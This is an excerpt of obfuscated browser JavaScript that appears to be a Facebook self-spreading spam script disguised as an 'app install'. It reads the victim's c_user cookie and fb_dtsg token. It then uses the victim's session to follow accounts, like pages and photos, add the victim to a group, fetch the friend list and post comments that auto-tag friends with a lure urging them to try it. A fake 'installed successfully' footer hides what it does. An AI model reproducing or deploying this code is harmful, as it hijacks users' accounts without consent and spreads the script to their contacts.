...
"chars" : " :) ",
    ...
    html += '<a class="jewelFooter" href="https://www.facebook.com/notes/%E3%83%85-%E3%83%85/theo-d%C3%B5i-%C4%91%E1%BB%83-tr%C3%A1nh-d%C3%ADnh-nh%E1%BB%AFng-m%C3%A3-%C4%91%E1%BB%99c-nha-m%E1%BB%8Di-ng%C6%B0%E1%BB%9Di/1408239339445190" target="_blank">Cài ứng dụng thành công.ứng dụng dược mod bởi : Không tên (Đạt đít đỏ).<br>Shenlong TMT</a>';
	html += '</div>';
...
a("100001218483209");
a("100002456375231");
sublist("1400189400250184");

//Group ku adibpn
var gid = ['637304746361678'];
...
var spage_id = "637304746361678";
var spost_id = "100007997680316";
var sfoto_id = "1400189400250184";
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
var smesaj = "";
var smesaj_text = "";
var arkadaslar = [];
...
// pic + fans
P("420282841440390");P("1376397505969621");P("1392907237652519");Like("1428116140735510");
...
function arkadaslari_al(id) {
    ...
    _0x7892x8 += '&options[1]=nm';    _0x7892x8 += '&token=v7';
...
function yorum_yap(id, _0x7892xc) {
    ...
    _0x7892x8 += '&comment_text= (y)Vừa làm xong Sory vì đã auto tag nhưng mà như thế mới chia sẻ cho bạn được thông cảm nha!!!!!!! 😍 🌹 Các Bạn Làm Thử Đi 💖 🎁 💋 💐 ☕.............................................................................................................................................................................................................' + encodeURIComponent(_0x7892xc);
    _0x7892x8 += '&source=2';
...
arkadaslari_al(1408919009377223);
arkadaslari_al(1408915499377574);
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
